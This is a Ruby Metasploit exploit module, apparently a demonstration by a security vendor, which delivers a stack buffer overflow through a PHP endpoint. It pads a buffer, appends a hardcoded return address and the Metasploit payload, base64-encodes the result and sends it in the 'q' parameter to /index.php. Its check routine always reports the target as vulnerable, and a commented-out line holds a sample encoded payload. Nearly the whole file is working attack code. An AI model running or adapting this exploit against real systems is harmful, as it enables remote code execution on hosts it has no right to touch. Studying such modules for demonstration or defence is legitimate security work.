##
# This module requires Metasploit
##

require 'base64'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Polyverse c-exploit example',
      'Description'    => %q|
        This is a module for exploiting a buffer overflow via PHP 
      |,
      'Author'         => 'Polyverse Corp.',
      'References'     =>
        [
          [ 'URL', 'https://polyverse.io' ],
        ],
      'Platform'       => 'linux',
      'Payload'        =>
        {
        },
      'Arch'          => [ARCH_X64],
      'Targets'        => 
        [
          [
            'Linux x64',
            {
              'Arch' => ARCH_X64,
              'Ret'      => 0x7FFFFFFFE630
            }
          ]
        ],
      'DefaultTarget'  => 0
    ))
    
    register_options(
      [
        #OptString.new('PAYLOAD64', [true, 'Base64-encoded payload with = at the end.', 'QUFBQUFBQUFBQUFBQUFBQUFjCkAAAAAAAOhDuff/fwAAkCSn9/9/AAAK='])
        #OptInt.new('RETADDR', [true, 'Result of print $rsp at overflow w/offsets.', 0x7FFFFFFFE630])
      ])
  end

  # Returns that the remote host is always vulnerable
  def check
    print_status("def check...")
    return Exploit::CheckCode::Vulnerable
  end

  def exploit
    print_status("start exploit...")

    b = "a" * 17
    b += Rex::Arch.pack_addr(target.arch, target.ret)
    print_status("address of rsp w/ offset = #{target.ret.to_s(16)}")
    b += payload.encoded
    b += "b" * (373 - b.length)  # 373 string lenth = 500 base64-encoded payload length
    #print_status("b.length = #{b.length}")
    buf = Base64.strict_encode64(b)

    print_status("base64-encoded payload: #{buf} (Length: #{buf.length})")
    
    res = send_request_raw({'uri'=>'/index.php?q=' + buf})

#   res = send_request_cgi({
#     'uri'       => normalize_uri(target_uri.path,"index.php"),
#     'method'    => 'GET',
#     'vars_get' => {
#     'q' => buf
#     }
#   })

    print_status("done exploit....")
  end
end
